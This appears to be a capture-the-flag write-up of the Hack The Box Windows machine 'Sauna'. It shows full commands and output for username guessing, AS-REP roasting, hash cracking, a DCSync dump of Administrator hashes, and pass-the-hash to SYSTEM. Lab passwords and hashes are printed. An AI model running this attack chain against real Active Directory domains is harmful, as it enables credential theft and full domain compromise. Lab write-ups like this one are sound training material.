---
title: "HTB - Sauna"
date: 2023-03-11T16:41:21+01:00
tags: [HTB, Easy, Windows]
---

> Sauna is an easy HTB windows machine involving real world user guessing, improper Active Directory configuration such as no pre-authentication enabled, misconfigured service accounts and password reuse.
> Overall a fun and easy box that goes over basic windows pentesting !


```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-12 01:53:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2023-02-12T01:54:21
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

> The domain name is `EGOTISTICAL-BANK.LOCAL0`

SMB Anonymous login is enabled but no share is available

```
❯ smbclient -L \\\\10.10.10.175\\                                                                                                                                                                                                     17:12:07
Password for [WORKGROUP\kali]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Ldapsearch doesn't give us any useful info.

## Webserver enumeration

While searching for attack vectors for this box, I remembered the recent 'Absolute' windows box. The foothold in this box was about user enumeration on the AD using metadata in picture files.
Navigating to the `/about.html` page, we can see multiple names that could be users on the AD.

Let's use username-anarchy to generate some password based on their first and last name

```
❯ /home/kali/username-anarchy/username-anarchy -i usernames_website.txt > password_gen_website.txt
```

We can then validate if there is a corresponding valid user on the domain using kerbrute

```
❯ /home/kali/kerbrute_linux_amd64 userenum --dc 10.10.10.175 --domain EGOTISTICAL-BANK.LOCAL password_gen_website.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/14/23 - Ronnie Flathers @ropnop

2023/02/14 04:59:52 >  Using KDC(s):
2023/02/14 04:59:52 >  	10.10.10.175:88

2023/02/14 04:59:52 >  [+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL
2023/02/14 04:59:53 >  Done! Tested 88 usernames (1 valid) in 0.283 seconds
```

Maybe this user doesn't require pre-authentication, let's check.

```
❯ impacket-GetNPUsers -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith -request -no-pass
[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3bf74079ee6a27450228115c24f9fa7a$f5486977edb41a40f9231517f657bdf5571066747d1f878d28cebcb951e3b7089b5cd561d83a4716cd33f87b919c4a982c3953c9e9de84965d8e5b58fab761c324b9c037a5402bc6232325997551f80398b9bbb7a90c88018f3ee463afbd1cdaeb1ca7ef5db4821d6e593b384882fb074cec17d8ef18b013fdf50d73d98cd44c52fe624c1978c305560c72c294ed2b31b18663794a43df584e4442d2ee93fb8c89b608afb75603f1c8fdcc3fe77fcb1e236ce8419e444c4bf08740440cb2d6611e0e3d5da75d2c62e83a72c324ab73787812fb11fabb45fd598f28a199ce6bce8ce3ebb2ec189ca00b49f4754dcc65a285aefc6099d1a9495a038af251940e02
```
It doesn't, we get a Ticket Granting Ticket (TGT) for fsmith. We can then use JTR to crack the hash

```
❯  rick fsmith_tgt.txt /usr/share/wordlists/rockyou.txt       
...
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
...
```

We can then access the box using evil-winrm and access the user flag in `C:\Users\FSmith\Desktop\user.txt`

```
❯ evil-winrm -i 10.10.10.175 -u 'fsmith'  -p 'Thestrokes23'                                                                                                                                                                           ...
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

Using winPEAS we can see that there is some credentials left for us:
```
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

Those are svc_loanmanager credentials, howerver upon inspecting `C:\Users\` we can see that they logged in as `svc_loanmgr`

```
Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/25/2020   1:05 PM                Administrator
d-----        1/23/2020   9:52 AM                FSmith
d-r---        1/22/2020   9:32 PM                Public
d-----        1/24/2020   4:05 PM                svc_loanmgr
```

This means that we can login as svc_loanmgr using winrm.

We then discover using bloodhound that svc_loanmgr can use a DCSync attack, this will allow us to dump the Administrator password from the AD.

```
❯ impacket-secretsdump EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175 -just-dc-user Administrator                                                                                                                                          06:24:30
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up...
```

We can then use `impacket-psexec` to login as Administrator using the NT hash and access the root flag under `C:\Users\Administrator\Desktop\root.txt`

```
❯ impacket-psexec EGOTISTICAL-BANK/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
...
C:\Users\Administrator\Desktop> whoami
nt authority\system
```


AAAAAAAAAAAAAAAA